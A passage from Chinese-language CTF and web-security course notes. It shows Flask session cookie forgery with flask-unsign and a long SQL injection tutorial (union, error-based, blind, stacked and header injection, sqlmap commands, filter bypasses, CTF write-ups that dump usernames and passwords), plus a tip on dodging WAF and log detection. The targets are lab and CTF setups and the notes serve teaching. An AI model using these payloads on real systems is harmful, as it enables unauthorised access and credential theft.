Cookie: session=<伪造后的 Cookie>
```

页面返回 flag（不同环境不同，形如 `picoCTF{...}`）。

### 总结

- 先 `--decode` 看结构，确认是不是 Flask 客户端 session。
- 字典来自题目源码 / 页面 / 常见弱密钥，不是瞎猜。
- 爆破成功后会直接告诉你 secret，复制去 `--sign`。
- 改的字段要和题目逻辑对上：这道题是 `very_auth`，不是 `role`。

## 7. WP2：源码泄露 SECRET_KEY（本地复现）

> 这是最常见的一类：题目给了源码，或者 `.git` / 备份泄露，`SECRET_KEY` 直接写在 `app.py` 里。

### 靶场代码

```python
from flask import Flask, session, request

app = Flask(__name__)
app.secret_key = "hnusec-flask-secret-2025"

@app.route("/")
def index():
    return "login as guest: /login?user=guest"

@app.route("/login")
def login():
    user = request.args.get("user", "guest")
    session["username"] = user
    session["role"] = "admin" if user == "admin" else "guest"
    return f"hello {user}"

@app.route("/flag")
def flag():
    if session.get("role") == "admin":
        return "flag{flask_session_forged}"
    return "only admin can see flag"
```

### 步骤

1. 访问 `/login?user=guest`，拿到 `session` Cookie。

```http
GET /login?user=guest HTTP/1.1
Host: 127.0.0.1:5000
```

响应：

```http
HTTP/1.1 200 OK
Set-Cookie: session=eyJyb2xlIjoiZ3Vlc3QiLCJ1c2VybmFtZSI6Imd1ZXN0In0.Z0...; HttpOnly; Path=/
```

2. 解码：

```bash
flask-unsign --decode --cookie 'eyJyb2xlIjoiZ3Vlc3QiLCJ1c2VybmFtZSI6Imd1ZXN0In0.Z0...'
# {'role': 'guest', 'username': 'guest'}
```

3. 从源码拿到 `SECRET_KEY = "hnusec-flask-secret-2025"`，伪造：

```bash
flask-unsign --sign \
  --cookie "{'role': 'admin', 'username': 'admin'}" \
  --secret 'hnusec-flask-secret-2025'
```

4. 带新 Cookie 访问 `/flag`：

```bash
curl -H "Cookie: session=<伪造后的 Cookie>" http://127.0.0.1:5000/flag
```

返回：

```text
flag{flask_session_forged}
```

### 总结

- 伪造时要把 session 里的字段补全：有的题校验 `username`，有的题校验 `_user_id`、`_fresh`、`csrf_token`。
- Flask-Login 的 session 常见字段：`_user_id`、`_fresh`、`_id`。伪造时最好先把原 Cookie 解出来，照着结构改。

## 8. WP3：弱密钥爆破（NSSCTF / SWPU 类题思路）

有些题不给源码，但 `SECRET_KEY` 很弱，直接用字典爆破：

```bash
# 1. 登录拿 Cookie
curl -c cookie.txt http://target/login -d "username=guest&password=guest"

# 2. 从 cookie.txt 里取 session 值，爆破
flask-unsign --unsign --cookie '<session值>' --wordlist keys.txt

# 3. 改 role / user_id 重签
flask-unsign --sign --cookie "{'role':'admin','user_id':1}" --secret '<爆破出的key>'

# 4. 替换 Cookie 访问后台 / flag
curl -b "session=<新Cookie>" http://target/flag
```

字典优先级：

1. 题目名、战队名、域名、作者 ID。
2. `secret`、`dev`、`development`、`test`、`flask`、`changeme`、`password`。
3. 常见弱密钥字典（`rockyou` 太大，先用小字典）。
4. 如果知道密钥生成逻辑（时间、随机数、MAC），直接复现。

### 总结

- 爆破成功与否取决于字典质量，不是工具。
- `flask-unsign --unsign` 既支持本地 Cookie，也支持 `--server` 直接打目标。
- 有些题会换 salt，记得加 `--salt`。
- 伪造后先访问一个普通页面看是否“登录成功”，再访问高权限接口，避免一上来就被 WAF / 日志记录。

## 9. flask_session 伪造检查清单

```text
[ ] Cookie 名是不是 session？
[ ] 值是不是三段式 base64.timestamp.signature？
[ ] flask-unsign --decode 能不能解出字典？
[ ] 字典里有没有 role / is_admin / username / user_id 这类权限字段？
[ ] 源码 / .git / 备份 / 环境变量 / SSTI / SSRF 有没有 SECRET_KEY？
[ ] 弱密钥字典能不能爆破？
[ ] 伪造后字段结构是否和原 session 一致？
[ ] 是否需要 _fresh / _user_id / csrf_token / _id？
[ ] 换 Cookie 后访问哪个接口验证？
```

> 一句话：**Flask session 伪造 = 找到 SECRET_KEY + 改字典 + 重签名。** 三步缺一不可。

---

# 第一节 SQL 注入

> 以下理论部分照搬 `D:\代码项目\正式课笔记-二阶段\04-SQL注入.md`；`## 本篇速览`、`## 课程大纲`、各分类和 sqlmap 用法都保留，题目 WP 见本章末尾的“SQL 注入题目 WP 补充”。

## 本篇速览

- SQL 注入的原理就是拼接 SQL 语句：先闭合原始逻辑，再用 `or 1=1` 造一个永远为真的条件，最后注释掉多余内容让语法正确。
- 注入点可能出现在 URL 查询参数、请求头（User-Agent / Referer / Cookie）和请求体（普通表单 / 文件上传 / JSON / XML）里，不同的提交方式和 Content-Type 对应不同的填 payload 方式。
- 按数据类型分为数字型、字符型、搜索型、XX 型、JSON 型注入；按语句分为 insert、update、delete 注入。
- 报错注入利用 `updatexml()` 第二个参数不传正确 xpath 就会报错的特性，配合 `concat(0x7e, ...)` 爆库、爆表、爆字段、爆数据。
- 还有宽字节注入、堆叠注入、二次注入；页面无回显时就用布尔盲注和时间盲注。
- 自动化工具用 sqlmap；遇到注释符、and/or、空格被过滤时，分别用逻辑闭合、`||` 或 `oorr`、`%20` 等方式绕过。

## 课程大纲

```text
SQL注入原理
    如何查找注入点位置
    URL编码
    发现注入点进行测试
SQL注入的分类
    按数据类型分类
    按提交方式分类
        1. GET 注入
        2. POST 注入
        3. Cookie
注入按回显情况分类
    1. 有回显注入（显错注入）
    2. 盲注（无回显注入）
报错注入
    SQL注入查询语句分类
  SQL注入的危害
```

## 第一部分：靶场环境与 Burp Suite

### 1. 搭建了两个靶场

- sqli 靶场：专门练习 sql 注入漏洞的一个靶场 —— 开启服务：Apache 2.4.39，MySQL 5.5.29
- pikachu 靶场：综合性靶场，里边包含了各种漏洞 —— 开启服务：Apache 2.4.39，MySQL 5.7.26

### 2. Burp Suite 抓包工具（在其内嵌浏览器中访问）

功能：抓包、改包、发包

- Intercept 拦截功能：
  - 绿灯 off：已关闭拦截/不抓包，改包，直接放行，正常上网。
  - 红灯 on：开启拦截/改包，浏览器所有请求都会停下来，卡在 Burp Suite 里边，等着你去放行/修改/丢弃等。
- 重放器 Repeater：重放器，最常用核心的功能，手动发包，改包，看响应，用来测试效果后发包。

## 第二部分：SQL 注入原理与注入点查找

### 3. SQL 注入

**原理：sql 注入就是拼接 sql 语句。**

**步骤：**

1. 找到注入点（现代网站常用 JSON-POST）
   - 先判断请求 Method：GET、POST、PUT、DELETE、PATCH、HEAD、OPTIONS 等
     - GET 请求是明文传输，常把信息拼接在 url 上，POST 则是现代大多数网站的请求方式
   - 再看跟随对应请求一起发给服务器的附加信息（请求头 Header）：Cookie、User-Agent、Referer、XFF —— 格式永远为：键:值
   - 再看请求体（读取 Concent-Type 解析后面请求体格式）：JSON、XML、普通表单、文件上传

**提交方式 / Content-Type 对照表：**

| 提交方式 | Content-Type | 能否页面输入框直接填 payload | 可以的 SQL 注入类型 | 操作方式 |
| --- | --- | --- | --- | --- |
| GET | URL 查询参数 | 可以，地址栏直接改 | 数字、字符、搜索、括号XX | 浏览器地址栏 / Hackbar |
| 表单/普通 POST | x-www-form-encoded | 可以页面输入框填写；但前端 JS 会过滤，常要抓包 | 数字、字符、搜索、括号XX | 页面输入框（可能被前端直接过滤）或 Bp 抓包 |
| 文件 POST | multipart/form-date | boundary 分割，有 filename | 文本参数可以：数字、字符、搜索、括号XX | 页面表单上传 / Bp 抓包 |
| JSON-POST | application/json | 不可以，页面没有 JSON 输入框 | 数字、字符、搜索、括号XX | Burp 抓包修改 JSON 请求体，注意 JSON 语法 |
| XML-POST | application/xml | 不可以，几乎没有页面输入框 | 1. XML 标签内 SQL 注入；2. 独立漏洞 XXE（非 SQL） | Burp 抓包写 XML 数据包 |

2. 根据不同 sql 的语法，先闭合原始逻辑，再插入 sql 语句
   - `or 1=1` 这是一个永远为真的条件，会查询表中所有数据
   - `#` 注释掉后面多余的内容，让 SQL 语句语法正确

### 4. URL 编码

- 输入的：`' or 1=1#`
- 网址栏中：`%27+or+1%3D1%23`

URL 解码工具：https://www.bejson.com/enc/urlencode/index.html

例如：

```text
' 单引号 -- %27
空格 -- %20 或者 +
地址、参数里的空格，也可用 + 替代（表单参数）
= -- %3D
# -- %23
```

### 5. 课堂上代码

```sql
USE pikachu;

SELECT * FROM member;
```

**正常的 sql 语句：**

```sql
SELECT username,email FROM member WHERE id=2;
```

**注入的/拼接的恶意代码：`or 1=1#`**

```sql
SELECT username,email FROM member WHERE id=1 OR 1=1#
```

**正常的 sql 语句：**

```sql
SELECT id,email FROM member WHERE username='kobe'
```

**注入的/拼接的恶意代码：`' or 1=1 #`**

```sql
SELECT id,email FROM member WHERE username='     ' OR 1=1#     '
```

通过以上总结出 sql 注入：

- 原理：sql 注入就是拼接 sql 语句
- 步骤：
  1. 需要闭合的先闭合
  2. `or 1=1` 这是一个永远为真的条件，会查询表中所有数据
  3. 注释掉后面多余的内容，让 sql 语句语正确

### 6. 猜解列名数量 order by

```sql
-- order by 排序，默认为升序/从小到大
SELECT * FROM member ORDER BY 1  # 根据第一个字段排序
SELECT * FROM member ORDER BY 2  # 根据第二个字段排序
SELECT * FROM member ORDER BY 3
SELECT * FROM member ORDER BY 4
SELECT * FROM member ORDER BY 5
SELECT * FROM member ORDER BY 6
SELECT * FROM member ORDER BY 7
SELECT * FROM member ORDER BY 8   #  会报错，刚刚到order by 7的时候是没有报错的，说明这个表一共有7个字段
```

**正常的 sql 语句：**

```sql
SELECT id,email FROM member WHERE username=''
```

**注入：`' or 1=1  order by 1 #`**

```sql
SELECT id,email FROM member WHERE username='   ' OR 1=1  ORDER BY 1 #   '
```

### 7. 利用 union select 联合查询

利用 union select 联合查询，获取一些信息，比如数据库名，用户名等等

```sql
SELECT * FROM member UNION SELECT 1,2,3,4,5,6,7;

SELECT * FROM member UNION SELECT USER(),DATABASE(),VERSION(),4,5,6,7;
```

## 第三部分：SQL 注入分类——按数据类型分类

### 1. 数字型注入

**正常的：**

```sql
SELECT username,email FROM member WHERE id=1
```

**注入的代码/payload/恶意代码：`1 OR 1=1#`**

```sql
SELECT username,email FROM member WHERE id=1 OR 1=1#
```

### 2. 字符型注入

**正常的：**

```sql
SELECT id,email FROM member WHERE username='vince'
```

**注入的：`vince' or 1=1#`**

```sql
SELECT id,email FROM member WHERE username='vince' OR 1=1#'
```

### 3. 搜索型注入

先要学会模糊查询 like，like 翻译成中文：像.....的样子
`%` 代表任意多个字符

```sql
SELECT username,id,email FROM member WHERE username LIKE '%v%'  # username包含字母v
SELECT username,id,email FROM member WHERE username LIKE '%n%'  # username包含字母n
SELECT username,id,email FROM member WHERE username LIKE 'v%'   # 必须以v开头的才能查到
```

**注入：`v%' OR 1=1#`**

```sql
SELECT username,id,email FROM member WHERE username LIKE '%    v%' OR 1=1 #     %'
```

### 4. XX 型注入

**正常的：**

```sql
SELECT id,email FROM member WHERE username=('vince')
```

**注入的：`vince') OR 1=1#`**

```sql
SELECT id,email FROM member WHERE username=('      vince') OR 1=1#      ')
```

### 5. json 类型注入 —— JSON-POST

JSON-POST -- 普通的表单 POST 注入形式相当于列表，JSON-POST 注入形式类似于字典。

```text
普通表单post格式类似于：username=admin&password=123456&id=100
json格式：{名字:值}  比如:{"username":"vince"}这是json类型的注入
```

**创建数据库表 json_test**

```sql
CREATE TABLE IF NOT EXISTS `json_test` (
  `id` INT(11) NOT NULL AUTO_INCREMENT,
  `username` VARCHAR(50) NOT NULL,
  `password` VARCHAR(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=INNODB DEFAULT CHARSET=utf8;

-- 插入测试数据
INSERT INTO `json_test` (`username`, `password`) VALUES
('admin', '123456'),
('test', 'test123'),
('guest', 'guest123');

-- 查询json_test表中所有的数据
SELECT * FROM json_test;
```

```text
# 字符型json：  {"username":"kobe"}
# 数字型json：  {"id":1}
```

运行 jsondemo.php 后，显示：

```text
{"code":400,"msg":"\u65e0\u6548\u8bf7\u6c42\uff01\u8bf7\u4f20\u5165JSON\u53c2\u6570\uff1a{\"username\":\"xxx\"} \u6216 {\"id\":1} \u6216 {\"search\":\"xxx\"}"}
```

这是 unicode，可以解码一下：https://www.jyshare.com/front-end/3602/

**正常的：**

```json
{"username":"admin"}
```

**json 类型注入 1：`{"username":"admin'or 1=1#"}`**

```json
{"username":"admin'or 1=1#"}
```

**正常的：**

```json
{"id":1}
```

**json 类型注入 2：`{"id":"1 or 1=1#"}`**

```json
{"id":"1 or 1=1#"}
```

- 普通注入的格式就是为：`什么 = 什么`
- JSON 注入的格式就是为：`{什么:什么}`
- 后台执行的 sql 语句都是一样的。

## 第四部分：HTTP Header 注入

原理：网站登录后，后台会记录访问日志：用户 IP，浏览器 User-Agent，Referer，Cookie

防护：

- 后端：1-做单引号转义，失去闭合能力；2-使用预编译（PDO 处理），只当字符串处理，不拼进 sql；3-白名单/过滤关键字（union，or，and）
- HTTP 层面：WAF/中间件过滤，截断

可以测试的头：User-Agent，Referer，Cookie

**User-Agent：**

```sql
（Mozilla）' or updatexml(1,concat(0x7e,database()),1) or '
```

**Cookie：**

```sql
1.（admin）' or updatexml(1,concat(0x7e,version(),0x7e),1) or '
2.（admin）' or updatexml(1,concat(0x7e,version(),0x7e),1) #
```

## 第五部分：UPDATEXML() 报错注入

先来演示一下 UPDATEXML() 报错函数正常的例子。这个函数本身是用来修改 xml 文档中的内容的。

**以下为正常传参数的演示（不会报错的）：**

```sql
SELECT UPDATEXML(
	'<book><name>mysql数据库从入门到跑路</name><price>99.99</price><author>许总</author></book>', -- 第一个参数：要修改的xml文档
	'/book/price', -- 第二个参数：要修改的xpath路径
	'<price>88.88</price>' -- 第三个参数：替换后/修改后的新内容
)
```

利用这个函数，就是因为如果这个函数的第二个参数我们不传一个正确的 xpath 路径，它就会报错。所以我们 --特意-- 不传正确的 xpath 路径，这样就报错了，然后在里边我们写我们自己想要拿到的数据，比如：查询数据库的版本，用户名，查库，查表，查数据等等。

**那我们怎么利用呢？第二个参数不传正确的路径格式：**

**注入：`' and updatexml(1,concat(0x7e,(select database()),0x7e),1) #`**

```sql
SELECT * FROM users WHERE username='   ' AND  UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1) #   ';
```

**为啥第二个参数要写 concat(0x7e,(select @@version),0x7e)**

学一个 `concat()` 函数：是一个字符串拼接函数

```sql
SELECT CONCAT("I"," ","love"," ","you!")
```

- `0x7e` 是 `~` 波浪线，用来分割数据，避免和错误信息混在一起
- `0x7e`：是 `~` 的十六进制编码，`~` 拼接，因为别的可能会吞字符，所以用特殊字符

### 常用信息查询语句

```sql
SELECT @@version; -- 查询mysql版本
SELECT USER(); -- 查询当前用户
SELECT VERSION(); -- 查询mysql版本
SELECT DATABASE(); -- 查询当前所在的数据库
```

### cookie 注入

**爆当前数据库：`' and updatexml(1,concat(0x7e,(select database()),0x7e),1) #`**

```sql
' and updatexml(1,concat(0x7e,(select database()),0x7e),1) #
```

**爆当前用户：`' and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)#`**

```sql
' and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)#
```

**爆数据库：`' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #`**

```sql
' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #
```

所以 -->

### 爆表

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='pikachu'
```

**直接爆表：`'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0)#`**

```sql
'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0)#
```

上边的直接爆表会报错，显示不止一行，因为有多个表，这里没有做约束，会查出很多表来，所以提示返回的结果不止一行。接着我们要进行约束，限制行数（一个一个表爆出来）。

`limit` 限制行数：第一个参数为前面几个不展示，第二个参数为接着展示几个。

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema='pikachu' LIMIT 1; -- 第一个表
SELECT table_name FROM information_schema.tables WHERE table_schema='pikachu' LIMIT 0,1; -- 第一个表
SELECT table_name FROM information_schema.tables WHERE table_schema='pikachu' LIMIT 1,1; -- 第二个表
SELECT table_name FROM information_schema.tables WHERE table_schema='pikachu' LIMIT 2,1; -- 第三个表
SELECT table_name FROM information_schema.tables WHERE table_schema='pikachu' LIMIT 3,1; -- 第四个表

-- 查询第3-5张表
SELECT table_name FROM information_schema.tables WHERE table_schema='pikachu' LIMIT 2,3;

# 拿5，6，7，8名   limit 4,4
```

**接着 burp 中爆表：**

```sql
' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 0,1)),0)#
```

**查看下一条记录：**

```sql
' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu' limit 1,1)),0)#
```

后边以此类推。

### 爆字段

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='pikachu' LIMIT 0,1
SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='pikachu' LIMIT 1,1
SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='pikachu' LIMIT 2,1
SELECT column_name FROM information_schema.columns WHERE table_name='users' AND table_schema='pikachu' LIMIT 3,1
```

**burp 中爆字段：**

```sql
' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' and table_schema='pikachu' limit0,1)),0)#
```

### 爆字段内容

```sql
USE pikachu;
SELECT PASSWORD FROM users LIMIT 0,1
```

**burp 中爆字段内容：**

```sql
' and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#
```

## 第六部分：MySQL 增删改查语句回顾

回顾一下 mysql 中查询，增加，修改，删除操作。

### 查询语句 select

语法：`select 列名(多个列名之间逗号隔开)/如果查询所有列名就是*   from   表名   where  条件;`

比如：查询 json_test 中所有的列名

```sql
SELECT * FROM json_test;
```

比如：查询 json_test 表中 id 为 2 的 username 和 password

```sql
SELECT username,PASSWORD FROM json_test WHERE id = 2;
```

比如：查询 admin 这个用户的密码

```sql
SELECT PASSWORD FROM json_test WHERE username = 'admin';
```

### 增加语句/插入语句 insert

语法：`insert into 表名(列名1,列名2) values(列名1的值,列名2的值)`

比如：向 json_test 添加一条数据

```sql
INSERT INTO json_test(username,PASSWORD) VALUES("niannian","nn88888");
```

### 修改语句 update

语法：`update 表名  set  列名1=列名1修改的值,列名2=列名2修改的值  where 条件`

比如：修改 id 为 4 的 username 为 zhangsan

```sql
UPDATE json_test SET username='zhangsan' WHERE id = 4;
```

### 删除语句 delete

语法：`delete from 表名 where 条件`

比如：删除 username 为 zhangsan 的用户信息

```sql
DELETE FROM json_test WHERE username='zhangsan';
```

## 第七部分：SQL 注入按照语句分类

分为 insert 注入，update 注入，delete 注入。

### 1. insert 注入：拼接恶意的代码到 insert 插入语句中

**正常的 SQL 语句：**

```sql
INSERT INTO member(username,pw,sex,phonenum,email,address) 
VALUES('nnn','nn88888','女','1888888888','23434@qq.com','长沙')
```

**源代码中的 sql 语句：**

```sql
INSERT INTO member(username,pw,sex,phonenum,email,address) VALUES('','','','','','')
```

**insert 注入的：`' or updatexml(1,concat(0x7e,(select database()),0x7e),1)  or '`**

```sql
INSERT INTO member(username,pw,sex,phonenum,email,address) 
VALUES('       ' OR UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1)  OR '      ','nn88888','女','1888888888','23434@qq.com','长沙')
```

### 2. update 注入：拼接恶意的代码到 update 修改语句中

**正常的 update 语句：**

```sql
UPDATE member SET sex='男',phonenum='1324',address='1',email='1' WHERE username='nnn'
```

**源代码中的 sql 语句：**

```sql
UPDATE member SET sex='',phonenum='',address='',email='' WHERE username=''
```

**update 注入的：`' or updatexml(1,concat(0x7e,(select user()),0x7e),1) or '`**

```sql
UPDATE member SET sex='女',phonenum='    ' OR UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1) OR '     ',address='21',email='3' WHERE username='aa';
```

### 3. delete 注入：拼接恶意的代码到 delete 删除语句中

**源代码中的 sql 语句：**

```sql
DELETE FROM message WHERE id=56;  # 正常的
```

**delete 注入的：`56 OR UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)`**

```sql
DELETE FROM message WHERE id=56 OR UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1); 
```

## 第八部分：宽字节注入

（PHP 版本在 5.4 以下可直接使用（gbk 模式），5.5 及以上要先主动设置编码格式）

**正常的：**

```sql
SELECT id,email FROM member WHERE username='vince'
```

**我们之前是这样子注入的：**

```sql
SELECT id,email FROM member WHERE username='   vince' OR 1=1#    '
```

**但是宽字节这里把我们用来闭合的单引号进行了转义，单引号被转义了，不能用了：**

```sql
SELECT id,email FROM member WHERE username='   vince\\\' or 1=1#    '
```

因为 mysql 是 GBK 进行编码的，GBK 规则是两个字节会拼成一个汉字。
GB2312 -- 升级为 GBK 编码，支持中文，一个中文是两个字节。

编码转换工具：https://tool.chinaz.com/tools/urlencode.aspx

- `\` 是 `%5C`
- 在 `%5C` 前面再拼一个字节，这样两个字节就变成了一个汉字
- 拼成：`%df%5c` 变成了：`運`

```sql
SELECT id,email FROM member WHERE username='   vince運\\' OR 1=1#    '
```

## 第九部分：堆叠注入

```sql
SELECT * FROM member;SELECT * FROM users;
SELECT * FROM member;CREATE TABLE test2 LIKE users;   # 创建一个跟users一模一样的表
SELECT * FROM member WHERE id = 4;DROP TABLE test2;
```

堆叠注入前提：

1. 后端 PHP 等代码没有禁用 multi_statements（多语句执行）；
2. 函数没做限制，没有过滤分号 `;`；
3. 前端查询只限制回显第一条语句，但是数据库允许执行多条。

但是我们发现数据库中不能执行多条。

## 第十部分：二次注入

**第一次：存入数据库中的数据：`admin'#`**

**然后第二次：**

```sql
select * from user where username='admin'#'
```

他不是通过一次达到目的，而是通过两次。

**普通注入 VS 二次注入**

- 普通注入：你输入恶意符号，网站当场没给过滤，直接拼接 sql 语句，立刻中招
- 二次注入：第一次输入恶意内容，正常存进数据库了；第二次网站从数据库读出这条数据，直接拼进新 sql 执行

## 第十一部分：盲注（无回显注入）

### 1. 布尔盲注

1 就是 true 成功了，对了；0 就是 false，错了。

```sql
select ascii('p')  # ascii码，美国标准信息交换码，每一个字母，每一个符号都对应有一个数字来表示,比如p字母是112
select ascii('A')
select substr(database(),1,1)  # p     substr()截取字符串

select ASCII(substr(Database(),1,1))=112;   # 返回1，说明猜对了

SELECT ASCII(SUBSTR(DATABASE(),1,1))=65;   # 返回0，说明猜错了

SELECT ASCII(SUBSTR(DATABASE(),1,1))>80;  # 猜对了
```

**注入的：**

```sql
select * from member where username = 'vince' and ASCII(SUBSTR(DATABASE(),1,1))>100

select * from member where username = 'vince' and ASCII(SUBSTR(DATABASE(),1,1))=112
```

**payload/注入的内容：`vince' and ASCII(SUBSTR(DATABASE(),1,1))>100 #`**

```sql
SELECT id,email FROM member WHERE username='  vince' and ASCII(SUBSTR(DATABASE(),1,1))>100 #  '
```

### 2. 时间盲注

通过 `and sleep(5)` 语句，观察页面响应时间判断注入是否生效。
`sleep(5)` 如果你看到页面等待了 5 秒才出结果，说明有注入点。

```sql
select sleep(5);

select if(1<2,"a","b"); # 条件运算符/三目运算符/三元运算符

select if(substr(database(),1,1)='p',sleep(5),null);
```

**正常的：**

```sql
select id,email from member where username='vince'
```

**怎么注入：`vince' and if(substr(database(),1,1)='p',sleep(5),null) #`**

```sql
select id,email from member where username='vince' and if(substr(database(),1,1)='p',sleep(5),NULL) #' 
```

## 第十二部分：sqlmap

```sql
USE SECURITY;
```

### 参数

- `-u` 指定网址
- `--dbs` 获取所有数据库名
- `--tables` 获取所有表名
- `--columns` 获取指定表的所有字段名
- `--dump` 导出指定字段的数据
- `--current-db` 获取当前连接的数据库名
- `--current-user` 获取当前数据库用户
- `-D` 指定目标数据库名　`-T` 指定目标表　`-C` 指定目标字段

### 基本用法

**爆数据库名：**

```bash
python sqlmap.py -u 网址 --dbs
```

**爆表名：**

```bash
python sqlmap.py -u 网址 -D 库名 --tables
```

**爆数据：**

```bash
python sqlmap.py -u 网址 -D 库名 -T 表名 --dump
```

### sqlmap 实战

**检测注入点：**

```bash
python sqlmap.py -u "http://127.0.0.1/sqli3/Less-1/?id=1" -p "id" --batch
```

**获取数据库：**

```bash
python sqlmap.py -u "http://127.0.0.1/sqli3/Less-1/?id=1" --current-db --batch
```

**获取数据表：**

```bash
python sqlmap.py -u "http://127.0.0.1/sqli3/Less-1/?id=1"  -D security --tables
```

**获取表中字段：**

```bash
python sqlmap.py -u "http://127.0.0.1/sqli3/Less-1/?id=1"  -D security -T users --columns
```

**获取表中数据：**

```bash
python sqlmap.py -u "http://127.0.0.1/sqli3/Less-1/?id=1"  -D security -T users -C username,password --dump
```

```sql
SELECT * FROM users;
```

## 第十三部分：SQL 注入绕过

（人家有防护了，我们要想办法绕过）

### 1. 绕过去除注释符的 SQL 注入

注释符不允许我们使用了，`#` 和 `--` 不允许我们用了。

**注入：`1' OR 1=1#`**

```sql
SELECT * FROM users WHERE id='   1' OR 1=1#  ' LIMIT 0,1       #以前能注入的
```

防护会变成了这样的：`#` 和 `--` 替换为了空

```sql
#SELECT * FROM users WHERE id='   1' or 1=1  ' LIMIT 0,1      # 会报错
```

绕过思路：不用注释符，用逻辑语句闭合多余引号。
核心逻辑：既然注释符无法使用，就用 `' or '1'='1` 逻辑语句，既满足注入条件，又能闭合后续多余的单引号，避免语法错误。

**注入：`' OR '1'='1`**

```sql
SELECT * FROM users WHERE id ='' OR '1'='1'  LIMIT 0,1
```

**尝试字段：**

```sql
SELECT * FROM users WHERE id ='1' ORDER BY 1 LIMIT 0,1
SELECT * FROM users WHERE id ='1' ORDER BY 2 LIMIT 0,1
SELECT * FROM users WHERE id ='1' ORDER BY 3 LIMIT 0,1
SELECT * FROM users WHERE id ='1' ORDER BY 4 LIMIT 0,1
```

测试出有三个字段

```sql
SELECT * FROM users WHERE id ='1' UNION SELECT 1,2,3 ORDER BY 3 LIMIT 0,1
```

发现页面无回显，尝试报错注入。

**注入的：`1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1) AND '`**

```sql
SELECT * FROM users WHERE id ='  1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1) AND ' ' LIMIT 0,1 
```

### 2. 绕过剔除 and/or 的 SQL 注入

and 和 or 不允许我们用了。

```sql
SELECT * FROM users WHERE id='1' LIMIT 0,1
SELECT * FROM users WHERE id='1' OR 1=1 #' LIMIT 0,1  # 之前能注入的
SELECT * FROM users WHERE id='1'  1=1 #' LIMIT 0,1    # 现在这里or不能用了
```

**绕过的第一个办法：`1' || 1=1-- `**

```sql
SELECT * FROM users WHERE id='1' || 1=1#' LIMIT 0,1   
```

**绕过的第二个办法：`1' oorr 1=1-- `**

```sql
# SELECT * FROM users WHERE id='1' oorr 1=1#' LIMIT 0,1   
```

### 3. 绕过去除空格的 SQL 注入

```sql
SELECT * FROM users WHERE id='1' LIMIT 0,1  
SELECT * FROM users WHERE id='1'or1=1#' LIMIT 0,1    #  空格不能用了
```

**注入的：`1'%20or%20'1'='1`**

```text
1'%20or%20'1'='1
```


## 1. pikachu 数字型注入（POST）

### 题目

pikachu 的 `SQL注入 -> 数字型注入(POST)`，页面是一个下拉框，选择用户后 POST `id`。

### 思路

1. 抓包，确认请求体是 `id=1&submit=submit`。
2. 先判断列数：`id=1 order by 2` 正常，`order by 3` 报错，说明查询结果有 2 列。
3. 用 `union select` 回显：

```http
POST /pikachu/vul/sqli/sqli_id.php HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

id=-1 union select 1,2&submit=submit
```

页面回显 `1` 和 `2`，说明第 1、2 列都能显示。

4. 爆库、爆表、爆字段：

```text
id=-1 union select 1,database()
id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='users'
id=-1 union select 1,group_concat(username,0x3a,password) from users
```

`0x3a` 是冒号 `:` 的十六进制，用来把用户名和密码拼在一起。

### 总结

- 数字型不需要引号闭合，直接 `-1 union select ...`。
- `-1` 是为了让前一条查询为空，页面只显示 union 后面的结果。
- `order by` 判断列数，`union select` 判断回显位，`information_schema` 爆结构。

---

## 2. CTFHub 整数型注入

### 题目

地址形如：

```text
http://challenge-xxxxxxxx.sandbox.ctfhub.com:10800/?id=1
```

### 思路

**第一步：判断列数**

```text
?id=1 order by 2
?id=1 order by 3
```

`order by 2` 正常，`order by 3` 报错 / 空白，说明当前查询有 2 列。

**第二步：判断回显位**

```text
?id=-1 union select 1,2
```

页面出现 `1`、`2`，说明两列都回显。

**第三步：爆库**

```text
?id=-1 union select 1,database()
```

回显数据库名，通常是 `sqli`。

**第四步：爆表**

```text
?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()
```

回显类似：

```text
flag,news
```

**第五步：爆字段**

```text
?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'
```

回显：

```text
flag
```

**第六步：爆数据**

```text
?id=-1 union select 1,group_concat(flag) from flag
```

页面返回：

```text
ctfhub{...}
```

复制提交即可。

### 总结

- 整数型注入的完整链路：`order by` → `union select` → `database()` → `information_schema.tables` → `information_schema.columns` → 目标表。
- `group_concat()` 能把多行拼成一行，适合一次拿完。
- 如果 `group_concat` 被过滤，用 `limit 0,1`、`limit 1,1` 一行一行拿。
- 如果 `information_schema` 被过滤，MySQL 5.7+ 可以试 `mysql.innodb_table_stats`、`sys.schema_table_statistics`，或者无列名注入。

---

## 3. CTFHub 字符型注入

### 题目

```text
http://challenge-xxxxxxxx.sandbox.ctfhub.com:10800/?id=1
```

和整数型的区别：SQL 语句里 `id` 被单引号包着：

```sql
SELECT * FROM news WHERE id='1'
```

### 思路

**第一步：找闭合**

```text
?id=1'
```

报错，说明单引号破坏了语法。

```text
?id=1' and 1=1#
?id=1' and 1=2#
```

